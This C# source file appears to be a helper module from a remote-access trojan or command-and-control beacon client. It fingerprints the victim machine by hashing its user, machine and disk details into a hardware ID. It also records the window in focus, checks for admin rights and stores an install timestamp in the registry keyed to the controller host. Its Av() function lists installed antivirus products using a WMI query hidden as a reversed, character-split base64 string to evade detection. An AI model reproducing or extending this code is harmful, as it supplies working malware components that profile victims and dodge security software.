using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using static System.Net.Mime.MediaTypeNames;

namespace Beacon.Helper
{
    internal class Helper
    {
        /// <summary>
        /// 获取窗口标题
        /// </summary>
        /// <returns></returns>
        public static string GetActiveWindowTitle()
        {
            try
            {
                const int nChars = 256;
                StringBuilder buff = new StringBuilder(nChars);
                IntPtr handle = Win32API.GetForegroundWindow();
                if (Win32API.GetWindowText(handle, buff, nChars) > 0)
                {
                    return buff.ToString();
                }
            }
            catch { }
            return "";
        }
        /// <summary>
        /// 判断指定进程是否存在
        /// </summary>
        /// <param name="processName"></param>
        /// <returns></returns>
        public static bool IsProcessExist(string processName)
        {
            if (processName.EndsWith(".exe", System.StringComparison.OrdinalIgnoreCase))
                processName = processName.Substring(0, processName.Length - 4);

            return Process.GetProcesses()
                .Any(p => string.Equals(p.ProcessName, processName, System.StringComparison.OrdinalIgnoreCase));
        }
        /// <summary>
        /// 获取安装时间
        /// </summary>
        /// <returns></returns>
        public static string GetInstallationTime()
        {
            // 根据IP和端口生成唯一键名
            string registryKey = $"InstallTime_{Settings.Hos_ts.Replace(".", "_").Replace(":", "_")}";
            string registryPath = @"Software\" + Settings.Hw_id;

            try
            {
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(registryPath))
                {
                    // 尝试读取已有的安装时间
                    object existingTime = key.GetValue(registryKey);

                    if (existingTime != null)
                    {
                        // 如果已存在，返回已有的时间
                        return existingTime.ToString();
                    }
                    else
                    {
                        // 如果不存在，写入当前时间并返回
                        string currentTime = DateTime.Now.ToUniversalTime().ToString();
                        key.SetValue(registryKey, currentTime, RegistryValueKind.String);
                        return currentTime;
                    }
                }
            }
            catch (Exception ex)
            {
               //返回现在的时间
                return DateTime.Now.ToUniversalTime().ToString();
            }
        }
        public static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }
        public static string HWID()
        {
            try
            {
                string strToHash = string.Concat(Environment.ProcessorCount, Environment.UserName,
                    Environment.MachineName, Environment.OSVersion
                    , new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize);
                MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
                byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
                bytesToHash = md5Obj.ComputeHash(bytesToHash);
                StringBuilder strResult = new StringBuilder();
                foreach (byte b in bytesToHash)
                    strResult.Append(b.ToString("x2"));
                return strResult.ToString().Substring(0, 20).ToUpper();
            }
            catch
            {
                return "Err HWID";
            }
        }
        public static string ReverseString(string input)
        {
            if (string.IsNullOrEmpty(input))
                return input;

            char[] arr = input.ToCharArray();
            Array.Reverse(arr);
            return new string(arr);
        }
        public static string Av()
        {
            try
            {
                string firewallName = string.Empty;
                // starting with Windows Vista we must use the root\SecurityCenter2 namespace
                string JiNJsDCXdf = Encoding.UTF8.GetString(Convert.FromBase64String(ReverseString("0" + "N" + "W" + "d" + "k" + "9" + "m" + "c" + "Q" + "N" + "X" + "d" + "y" + "l" + "m" + "d" + "p" + "R" + "n" + "b" + "B" + "B" + "S" + "b" + "v" + "J" + "n" + "Z" + "g" + "o" + "C" + "I" + "0" + "N" + "W" + "Z" + "s" + "V" + "2" + "U"))); //Select * from AntivirusProduct
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", JiNJsDCXdf))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        firewallName += mObject["displayName"].ToString() + "; ";
                    }
                }
                firewallName = RemoveLastChars(firewallName);

                return (!string.IsNullOrEmpty(firewallName)) ? firewallName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }
        public static string RemoveLastChars(string input, int amount = 2)
        {
            if (input.Length > amount)
                input = input.Remove(input.Length - amount);
            return input;
        }


    }
}
